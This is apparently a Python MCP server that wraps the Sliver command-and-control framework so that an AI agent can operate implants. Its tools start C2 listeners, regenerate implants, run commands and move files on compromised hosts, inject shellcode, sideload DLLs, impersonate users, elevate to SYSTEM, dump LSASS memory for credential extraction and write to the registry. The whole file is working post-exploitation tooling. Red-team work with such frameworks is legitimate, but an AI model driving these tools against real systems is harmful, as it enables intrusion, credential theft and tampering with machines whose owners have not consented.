#!/usr/bin/env -S uv run
# /// script
# requires-python = ">=3.11"
# dependencies = [
#   "fastmcp>=2.0",
#   "sliver-py>=0.0.6",
#   "protobuf>=4.0",
# ]
# ///
"""Sliver C2 MCP server — wraps the Sliver Python SDK for server and implant interaction.

Env vars:
  SLIVER_CONFIG_FILE  (path to operator .cfg file; auto-discovers ~/.sliver-client/configs/ if unset)
  SLIVER_TIMEOUT      (default: 60)
"""

from __future__ import annotations

import os
import tempfile
from pathlib import Path
from typing import Annotated, Any

from fastmcp import FastMCP
from sliver import InteractiveBeacon, InteractiveSession, SliverClient, SliverClientConfig
from sliver.pb.clientpb import client_pb2
from sliver.pb.sliverpb import sliver_pb2

mcp = FastMCP("sliver")

MAX_OUTPUT_CHARS = 1_048_576
DEFAULT_CONFIG_DIR = str(Path.home() / ".sliver-client" / "configs")

# ── Connection state ─────────────────────────────────────────────────

_client: SliverClient | None = None
_interact: InteractiveSession | InteractiveBeacon | None = None
_interact_id: str | None = None
_interact_type: str | None = None
_timeout: int = 60


def _discover_config() -> str | None:
    cfg_dir = Path(DEFAULT_CONFIG_DIR)
    if not cfg_dir.is_dir():
        return None
    configs = sorted(cfg_dir.glob("*.cfg"), key=lambda p: p.stat().st_mtime, reverse=True)
    return str(configs[0]) if configs else None


async def _get_client() -> SliverClient:
    global _client, _timeout
    if _client is not None:
        return _client
    _timeout = int(os.environ.get("SLIVER_TIMEOUT", "60"))
    config_path = os.environ.get("SLIVER_CONFIG_FILE") or _discover_config()
    if not config_path:
        raise RuntimeError(
            "No Sliver config found. Set SLIVER_CONFIG_FILE or place a .cfg in ~/.sliver-client/configs/"
        )
    config = SliverClientConfig.parse_config_file(Path(config_path))
    _client = SliverClient(config)
    await _client.connect()
    return _client


async def _get_interact() -> InteractiveSession | InteractiveBeacon:
    if _interact is None:
        raise RuntimeError("No active implant. Call interact(implant_id=...) first.")
    return _interact


async def _resolve(result: Any) -> Any:
    """Beacons return awaitable tasks; sessions return results directly."""
    if _interact_type == "beacon" and callable(getattr(result, "__await__", None)):
        return await result
    return result


def _truncate(text: str) -> str:
    if len(text) <= MAX_OUTPUT_CHARS:
        return text
    half = MAX_OUTPUT_CHARS // 2
    return text[:half] + "\n...[truncated]...\n" + text[-half:]


# ── Connection tools ─────────────────────────────────────────────────


@mcp.tool
async def connect(
    config_file: Annotated[str | None, "Path to Sliver operator config file (.cfg)"] = None,
) -> str:
    """Connect to a Sliver C2 server. Uses env var or auto-discovery if no config_file given."""
    global _client, _interact, _interact_id, _interact_type
    _client = None
    _interact = None
    _interact_id = None
    _interact_type = None
    if config_file:
        os.environ["SLIVER_CONFIG_FILE"] = config_file
    client = await _get_client()
    version = await client.version()
    return f"Connected to Sliver v{version.Major}.{version.Minor}.{version.Patch}"


@mcp.tool
async def interact(
    implant_id: Annotated[str, "Session or beacon ID to interact with"],
    implant_type: Annotated[str, "Type: 'session' or 'beacon'"] = "session",
) -> str:
    """Set the active implant for subsequent commands (ls, execute, upload, etc.)."""
    global _interact, _interact_id, _interact_type
    client = await _get_client()
    if implant_type == "beacon":
        _interact = await client.interact_beacon(implant_id)
    else:
        _interact = await client.interact_session(implant_id)
    if _interact is None:
        raise RuntimeError(f"Could not interact with {implant_type} '{implant_id}'.")
    _interact_id = implant_id
    _interact_type = implant_type
    return f"Now interacting with {implant_type} {implant_id}"


# ── Server tools ─────────────────────────────────────────────────────


@mcp.tool
async def get_sessions() -> list[dict]:
    """List all active Sliver sessions (interactive real-time connections)."""
    client = await _get_client()
    return [
        {
            "id": s.ID,
            "name": s.Name,
            "remote_address": s.RemoteAddress,
            "hostname": s.Hostname,
            "username": s.Username,
            "os": s.OS,
            "arch": s.Arch,
            "transport": s.Transport,
            "pid": s.PID,
            "filename": s.Filename,
            "active_c2": s.ActiveC2,
        }
        for s in await client.sessions()
    ]


@mcp.tool
async def get_beacons() -> list[dict]:
    """List all active Sliver beacons (async callback implants)."""
    client = await _get_client()
    return [
        {
            "id": b.ID,
            "name": b.Name,
            "hostname": b.Hostname,
            "username": b.Username,
            "os": b.OS,
            "arch": b.Arch,
            "transport": b.Transport,
            "interval": b.Interval,
            "jitter": b.Jitter,
            "remote_address": b.RemoteAddress,
            "pid": b.PID,
            "filename": b.Filename,
            "active_c2": b.ActiveC2,
        }
        for b in await client.beacons()
    ]


@mcp.tool
async def get_jobs() -> list[dict]:
    """List all active jobs (listeners) on the Sliver server."""
    client = await _get_client()
    return [
        {"id": j.ID, "name": j.Name, "protocol": j.Protocol, "port": j.Port, "description": j.Description}
        for j in await client.jobs()
    ]


@mcp.tool
async def start_mtls_listener(
    host: Annotated[str, "Interface to bind on"] = "0.0.0.0",
    port: Annotated[int, "Port for the mTLS listener"] = 8888,
) -> str:
    """Start a mutual TLS (mTLS) C2 listener on the Sliver server."""
    client = await _get_client()
    r = await client.start_mtls_listener(host=host, port=port)
    return f"Started mTLS listener — Job ID: {r.JobID}"


@mcp.tool
async def start_https_listener(
    host: Annotated[str, "Interface to bind on"] = "0.0.0.0",
    port: Annotated[int, "Port for the HTTPS listener"] = 443,
    domain: Annotated[str, "Domain for the HTTPS listener"] = "",
) -> str:
    """Start an HTTPS C2 listener on the Sliver server."""
    client = await _get_client()
    r = await client.start_https_listener(host=host, port=port, domain=domain)
    return f"Started HTTPS listener — Job ID: {r.JobID}"


@mcp.tool
async def start_http_listener(
    host: Annotated[str, "Interface to bind on"] = "0.0.0.0",
    port: Annotated[int, "Port for the HTTP listener"] = 80,
    domain: Annotated[str, "Domain for the HTTP listener"] = "",
) -> str:
    """Start an HTTP C2 listener on the Sliver server."""
    client = await _get_client()
    r = await client.start_http_listener(host=host, port=port, domain=domain)
    return f"Started HTTP listener — Job ID: {r.JobID}"


@mcp.tool
async def start_dns_listener(
    domains: Annotated[list[str], "DNS domains for the listener"],
    host: Annotated[str, "Interface to bind on"] = "0.0.0.0",
    port: Annotated[int, "Port for the DNS listener"] = 53,
) -> str:
    """Start a DNS C2 listener on the Sliver server."""
    client = await _get_client()
    r = await client.start_dns_listener(domains=domains, host=host, port=port)
    return f"Started DNS listener — Job ID: {r.JobID}"


@mcp.tool
async def kill_job(
    job_id: Annotated[int, "Job ID to kill"],
) -> str:
    """Kill an active listener job."""
    client = await _get_client()
    r = await client.kill_job(job_id)
    return f"Killed job {r.ID}"


@mcp.tool
async def kill_session(
    session_id: Annotated[str, "Session ID to terminate"],
    force: Annotated[bool, "Force kill without graceful shutdown"] = False,
) -> str:
    """Terminate a Sliver session."""
    client = await _get_client()
    await client.kill_session(session_id, force=force)
    return f"Session {session_id} terminated"


@mcp.tool
async def kill_beacon(
    beacon_id: Annotated[str, "Beacon ID to terminate"],
) -> str:
    """Terminate a Sliver beacon."""
    client = await _get_client()
    await client.kill_beacon(beacon_id)
    return f"Beacon {beacon_id} terminated"


@mcp.tool
async def get_implant_builds() -> list[dict]:
    """List all stored implant builds on the Sliver server."""
    client = await _get_client()
    builds = await client.implant_builds()
    result = []
    for name, build in builds.items():
        c2_urls = [c2.URL for c2 in build.C2] if build.C2 else []
        result.append(
            {
                "name": name,
                "os": build.GOOS,
                "arch": build.GOARCH,
                "format": str(build.Format),
                "c2": c2_urls,
                "is_beacon": build.IsBeacon,
            }
        )
    return result


@mcp.tool
async def regenerate_implant(
    implant_name: Annotated[str, "Name of a previously generated implant to regenerate."],
) -> str:
    """Regenerate a previously compiled implant by name. Returns the implant binary which can then be deployed to a target."""
    client = await _get_client()
    result = await client.regenerate_implant(implant_name, timeout=360)
    size_kb = len(result.File.Data) / 1024
    return f"Regenerated implant '{implant_name}' ({size_kb:.1f} KB)"


# ── Implant tools (require interact() first) ────────────────────────


@mcp.tool
async def execute(
    exe: Annotated[str, "Path to executable on target"],
    args: Annotated[list[str] | None, "Command-line arguments"] = None,
    output: Annotated[bool, "Capture stdout/stderr"] = True,
) -> str:
    """Execute a program on the target system."""
    impl = await _get_interact()
    result = await _resolve(await impl.execute(exe, args or [], output=output))
    out = result.Stdout.decode(errors="replace") if result.Stdout else ""
    err = result.Stderr.decode(errors="replace") if result.Stderr else ""
    combined = out + (f"\n[stderr]\n{err}" if err else "")
    return _truncate(combined) if combined.strip() else f"Command completed (status: {result.Status})"


@mcp.tool
async def ls(
    path: Annotated[str, "Directory path on target"] = ".",
) -> str:
    """List files and directories on the target system."""
    impl = await _get_interact()
    result = await _resolve(await impl.ls(path))
    lines = [f"Path: {result.Path}"]
    for f in result.Files:
        ftype = "d" if f.IsDir else "f"
        lines.append(f"[{ftype}] {f.Name:40s}  {f.Size:>10d} bytes")
    return _truncate("\n".join(lines))


@mcp.tool
async def cd(path: Annotated[str, "Directory to change to"]) -> str:
    """Change the implant's working directory."""
    impl = await _get_interact()
    result = await _resolve(await impl.cd(path))
    return f"Changed directory to: {result.Path}"


@mcp.tool
async def pwd() -> str:
    """Print the implant's current working directory."""
    impl = await _get_interact()
    result = await _resolve(await impl.pwd())
    return f"Current directory: {result.Path}"


@mcp.tool
async def mkdir(
    path: Annotated[str, "Directory path to create on target"],
) -> str:
    """Create a directory on the target system."""
    impl = await _get_interact()
    result = await _resolve(await impl.mkdir(path))
    return f"Created directory: {result.Path}"


@mcp.tool
async def rm(
    path: Annotated[str, "File or directory path to remove on target"],
    recursive: Annotated[bool, "Recursively remove directories"] = False,
    force: Annotated[bool, "Force removal without confirmation"] = False,
) -> str:
    """Remove a file or directory on the target system."""
    impl = await _get_interact()
    await _resolve(await impl.rm(path, recursive=recursive, force=force))
    return f"Removed: {path}"


@mcp.tool
async def upload(
    local_path: Annotated[str, "Local file path to upload"],
    remote_path: Annotated[str, "Destination path on target"],
) -> str:
    """Upload a local file to the target system."""
    impl = await _get_interact()
    with open(local_path, "rb") as f:
        data = f.read()
    result = await _resolve(await impl.upload(remote_path, data))
    return f"Uploaded to {result.Path} ({len(data) / 1024:.1f} KB)"


@mcp.tool
async def download(
    remote_path: Annotated[str, "File path on target to download"],
) -> str | dict:
    """Download a file from the target and save it locally."""
    impl = await _get_interact()
    result = await _resolve(await impl.download(remote_path))
    filename = Path(remote_path).name
    tmp = Path(tempfile.mkdtemp()) / filename
    tmp.write_bytes(result.Data)
    return {"name": filename, "path": str(tmp), "size_kb": len(result.Data) / 1024}


@mcp.tool
async def download_to_local_file(
    remote_path: Annotated[str, "File path on target to download"],
) -> dict:
    """Download a file from the target and save it to a local temporary file. Returns name and path."""
    impl = await _get_interact()
    result = await _resolve(await impl.download(remote_path))
    filename = Path(remote_path).name
    tmp = Path(tempfile.mkdtemp()) / filename
    tmp.write_bytes(result.Data)
    return {"name": filename, "path": str(tmp)}


@mcp.tool
async def ps() -> str:
    """List running processes on the target."""
    impl = await _get_interact()
    procs = await _resolve(await impl.ps())
    lines = [f"{'PID':>7}  {'PPID':>7}  {'Owner':20}  Executable"]
    lines.extend(f"{p.Pid:7d}  {p.Ppid:7d}  {p.Owner:20s}  {p.Executable}" for p in procs)
    return _truncate("\n".join(lines))


@mcp.tool
async def terminate_process(
    pid: Annotated[int, "Process ID to terminate"],
    force: Annotated[bool, "Force kill the process"] = False,
) -> str:
    """Kill a process by PID on the target system."""
    impl = await _get_interact()
    await _resolve(await impl.terminate(pid, force=force))
    return f"Process {pid} terminated"


@mcp.tool
async def ifconfig() -> str:
    """List network interfaces on the target."""
    impl = await _get_interact()
    result = await _resolve(await impl.ifconfig())
    lines = []
    for iface in result.NetInterfaces:
        addrs = ", ".join(iface.IPAddresses) if iface.IPAddresses else "no addresses"
        lines.append(f"{iface.Name}: MAC={iface.MAC}  IPs=[{addrs}]")
    return "\n".join(lines) or "No network interfaces found."


@mcp.tool
async def netstat(
    tcp: Annotated[bool, "Show TCP connections"] = True,
    udp: Annotated[bool, "Show UDP connections"] = True,
    ipv4: Annotated[bool, "Show IPv4 connections"] = True,
    ipv6: Annotated[bool, "Show IPv6 connections"] = False,
    listening: Annotated[bool, "Only show listening ports"] = True,
) -> str:
    """Show active network connections on the target."""
    impl = await _get_interact()
    result = await _resolve(await impl.netstat(tcp=tcp, udp=udp, ipv4=ipv4, ipv6=ipv6, listening=listening))
    lines = [f"{'Proto':10}  {'Local':30}  {'Remote':30}  State"]
    for e in result.Entries:
        local = f"{e.LocalAddr.Ip}:{e.LocalAddr.Port}"
        remote = f"{e.RemoteAddr.Ip}:{e.RemoteAddr.Port}" if e.RemoteAddr else "-"
        lines.append(f"{e.Protocol:10}  {local:30}  {remote:30}  {e.SkState}")
    return _truncate("\n".join(lines))


@mcp.tool
async def screenshot() -> dict:
    """Capture a screenshot of the target's display."""
    impl = await _get_interact()
    result = await _resolve(await impl.screenshot())
    tmp = Path(tempfile.mkdtemp()) / "screenshot.png"
    tmp.write_bytes(result.Data)
    return {"name": "screenshot.png", "path": str(tmp), "size_kb": len(result.Data) / 1024}


@mcp.tool
async def execute_assembly(
    assembly_path: Annotated[str, "Local path to .NET assembly (.exe/.dll)"],
    arguments: Annotated[str, "Arguments for the assembly"] = "",
    is_dll: Annotated[bool, "Whether the assembly is a DLL"] = False,
    arch: Annotated[str, "Target architecture: x86 or x64"] = "x64",
) -> str:
    """Execute a .NET assembly in-memory on the target (execute-assembly)."""
    impl = await _get_interact()
    with open(assembly_path, "rb") as f:
        data = f.read()
    result = await _resolve(
        await impl.execute_assembly(
            data, arguments=arguments, process="", is_dll=is_dll, arch=arch, class_name="", method="", app_domain=""
        )
    )
    out = result.Output.decode(errors="replace") if result.Output else "Assembly executed with no output."
    return _truncate(out)


@mcp.tool
async def execute_shellcode(
    shellcode_path: Annotated[str, "Local path to raw shellcode file"],
    pid: Annotated[int, "Target PID to inject into (0 = self)"] = 0,
    rwx: Annotated[bool, "Use RWX permissions (more detectable)"] = False,
) -> str:
    """Inject and execute raw shellcode on the target."""
    impl = await _get_interact()
    with open(shellcode_path, "rb") as f:
        sc = f.read()
    await _resolve(await impl.execute_shellcode(sc, rwx=rwx, pid=pid))
    return f"Shellcode injected ({len(sc)} bytes, pid={pid})"


@mcp.tool
async def sideload(
    dll_path: Annotated[str, "Local path to shared library (DLL/SO/dylib)"],
    entry_point: Annotated[str, "Export function name to call"] = "",
    arguments: Annotated[str, "Arguments to pass to the entry point"] = "",
    process_name: Annotated[str, "Sacrificial process to host the library"] = "",
    kill: Annotated[bool, "Kill the sacrificial process after execution"] = True,
) -> str:
    """Load a shared library into a sacrificial process and call an export on the target."""
    impl = await _get_interact()
    with open(dll_path, "rb") as f:
        dll_data = f.read()
    result = await _resolve(
        await impl.sideload(
            dll_data, process_name=process_name, arguments=arguments, entry_point=entry_point, kill=kill
        )
    )
    out = result.Result.decode(errors="replace") if result.Result else "Sideload completed with no output."
    return _truncate(out)


@mcp.tool
async def get_env(
    name: Annotated[str, "Environment variable name (empty for all)"] = "",
) -> str:
    """Get environment variables from the target system."""
    impl = await _get_interact()
    result = await _resolve(await impl.get_env(name))
    lines = [f"{v.Key}={v.Value}" for v in result.Variables]
    return _truncate("\n".join(lines)) if lines else "No environment variables found."


@mcp.tool
async def whoami() -> str:
    """Get the current user context on the target system."""
    impl = await _get_interact()
    result = await _resolve(await impl.execute("whoami", [], output=True))
    out = result.Stdout.decode(errors="replace") if result.Stdout else ""
    return out.strip() or "Could not determine current user."


@mcp.tool
async def impersonate(
    username: Annotated[str, "Username to impersonate"],
) -> str:
    """Impersonate a user on the target (Windows only)."""
    impl = await _get_interact()
    await _resolve(await impl.impersonate(username))
    return f"Now impersonating: {username}"


@mcp.tool
async def make_token(
    username: Annotated[str, "Username for the logon token"],
    password: Annotated[str, "Password for the logon token"],
    domain: Annotated[str, "Domain for the logon token"] = "",
) -> str:
    """Create a Windows logon token with the specified credentials."""
    impl = await _get_interact()
    await _resolve(await impl.make_token(username, password, domain))
    return f"Token created for {domain}\\{username}" if domain else f"Token created for {username}"


@mcp.tool
async def revert_to_self() -> str:
    """Revert any active impersonation back to the original user context."""
    impl = await _get_interact()
    await _resolve(await impl.revert_to_self())
    return "Reverted to original user context"


@mcp.tool
async def run_as(
    username: Annotated[str, "Username to run the process as"],
    process_name: Annotated[str, "Path to the process to run"],
    args: Annotated[str, "Arguments for the process"] = "",
) -> str:
    """Run a process as a different user on the target."""
    impl = await _get_interact()
    result = await _resolve(await impl.run_as(username, process_name, args))
    out = result.Output.decode(errors="replace") if result.Output else ""
    return _truncate(out) if out.strip() else "Process started with no output."


@mcp.tool
async def get_system() -> str:
    """Attempt to elevate to SYSTEM privileges on the target (Windows only)."""
    impl = await _get_interact()
    result = await _resolve(await impl.get_system(hosting_process="", config=client_pb2.ImplantConfig()))
    return f"Elevated to SYSTEM. New session: {result.Session.ID if result.Session else 'pending'}"


@mcp.tool
async def process_dump(
    pid: Annotated[int, "Process ID to dump (e.g. LSASS PID)"],
) -> dict:
    """Dump the memory of a process on the target (e.g. for LSASS credential extraction)."""
    impl = await _get_interact()
    result = await _resolve(await impl.process_dump(pid))
    tmp = Path(tempfile.mkdtemp()) / f"procdump_{pid}.dmp"
    tmp.write_bytes(result.Data)
    return {"name": f"procdump_{pid}.dmp", "path": str(tmp), "size_kb": len(result.Data) / 1024}


@mcp.tool
async def registry_read(
    hive: Annotated[str, "Registry hive (e.g. HKLM, HKCU)"],
    reg_path: Annotated[str, "Registry key path"],
    key: Annotated[str, "Value name to read"],
    hostname: Annotated[str, "Remote hostname (empty for local)"] = "",
) -> str:
    """Read a value from the Windows registry on the target."""
    impl = await _get_interact()
    result = await _resolve(await impl.registry_read(hive, reg_path, key, hostname))
    return f"Registry value [{hive}\\{reg_path}\\{key}]: {result.Value}"


@mcp.tool
async def registry_write(
    hive: Annotated[str, "Registry hive (e.g. HKLM, HKCU)"],
    reg_path: Annotated[str, "Registry key path"],
    key: Annotated[str, "Value name to write"],
    string_value: Annotated[str, "String value to write"] = "",
    hostname: Annotated[str, "Remote hostname (empty for local)"] = "",
) -> str:
    """Write a value to the Windows registry on the target."""
    impl = await _get_interact()
    await _resolve(
        await impl.registry_write(
            hive,
            reg_path,
            key,
            hostname,
            string_value=string_value,
            byte_value=b"",
            dword_value=0,
            qword_value=0,
            reg_type=sliver_pb2.RegistryType.String,
        )
    )
    return f"Wrote '{string_value}' to {hive}\\{reg_path}\\{key}"


if __name__ == "__main__":
    mcp.run(transport="stdio")
